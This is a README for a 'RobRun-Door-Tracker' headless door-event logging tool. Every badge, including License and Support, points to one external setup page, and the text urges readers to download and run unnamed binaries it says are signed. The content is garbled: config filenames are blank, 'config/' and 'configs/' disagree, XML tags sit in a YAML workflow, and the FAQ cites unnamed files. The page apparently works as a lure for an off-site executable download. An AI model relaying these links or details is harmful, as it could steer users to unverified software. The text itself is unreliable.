# RobRun-Door-Tracker

<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Download-Release-15803d?style=flat-square&logo=rocket&logoColor=white" alt="Download">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=apache&logoColor=white" alt="License">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Version-1.3.0-blue?style=plastic&logo=git&logoColor=white" alt="Version">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Build-2026.11.19-orange?style=flat&logo=travis&logoColor=white" alt="Build">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Support-Stack%20Exchange-blue?style=flat-square&logo=stack-exchange&logoColor=white" alt="Support">
</a>

---

## What is the RobRun-Door-Tracker?

Ever wondered how to keep track of a door’s state during a timed run without manual logs? The RobRun-Door-Tracker gives you a structured, configuration‑driven approach to monitor, record, and analyze door events in real time. It bundles ready‑to‑use presets, a flexible profile system, and a compact release package that can be dropped into any existing RobRun environment.

---

## Workflow Presets

Presets are YAML snippets that describe a typical door‑tracking session. They include the expected number of events, timing windows, and post‑processing hooks.

```yaml
# example-preset.yaml
name: "Standard Run"
events: 12
window_seconds: 300
post_process: "summarize"
```

A full list of bundled presets is available in the `presets/` directory. To apply a preset, copy its file into the working folder and start the tracker; the system will parse the YAML and configure itself automatically.

---

## Release Bundle

The latest release (v1.3.0) contains:

* `Release` – Portable Windows binary
* `RobRun-Door-Tracker.app` – macOS bundle
* `RobRun-Door-Tracker.jar` – Cross‑platform Java wrapper
* `docs/` – User manual and API reference
* `samples/` – Example configuration sets

All binaries are signed and tested against the current RobRun core. The bundle can be downloaded from the button above or via the `Release` tag in the repository.

---

## Directory Tree

RobRun‑Door‑Tracker
├── bin
│   ├── RobRun‑Door‑Release
│   ├── RobRun‑Door‑Tracker.app
│   └── RobRun‑Door‑Tracker.jar
├── config
│   ├──
│   ├──
│   ├──
│   └──
├── presets
│   ├── standard-run.yaml
│   ├── rapid-fire.yaml
│   └── long‑haul.yaml
├── docs
│   ├── User‑Guide.md
│   └── API‑Reference.md
└── samples
    ├── sample‑
    └── sample‑preset.yaml

---

## Installation & Usage

1. **Download** the desired binary from the release bundle.
2. **Extract** the archive to a folder of your choice.
3. **Place** or edit the `config/` files as needed.
4. **Select** a preset from `presets/` or create a custom YAML.
5. **Run** the binary; the application will:
   * Load configuration layers in order
   * Read the preset and initialize event monitoring
   * Emit real‑time logs to `output.log`
6. **Review** the log or import it into your data‑analysis utility.

The tracker operates without a user interface, making it ideal for headless server setups or embedded systems.

---

## Troubleshooting & FAQ

| Question | Answer |
|----------|--------|
| **Why does the tracker stop after 10 events?** | Check the `max_events` tag in ``. The default is 1000; if it’s lower, the engine will terminate early. |
| **I receive “File not found” for ``.** | The tracker only loads `` if it exists. If you need profile‑specific settings, create the file and populate it with the required tags. |
| **Logs are not timestamped.** | Ensure that the `` contains `<timestamp>enabled</timestamp>`. This flag activates ISO‑8601 timestamps. |
| **Preset YAML parsing fails.** | Validate the YAML syntax with an online linter. The tracker expects standard YAML; indentation errors cause the parser to exit. |
| **How can I add a new event type?** | Add a `<event_type>` tag to `` and map it in the preset’s `events` section. |

If none of the above resolves your issue, consult the `docs/API-Reference.md` for deeper diagnostics or open an issue in the repository.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```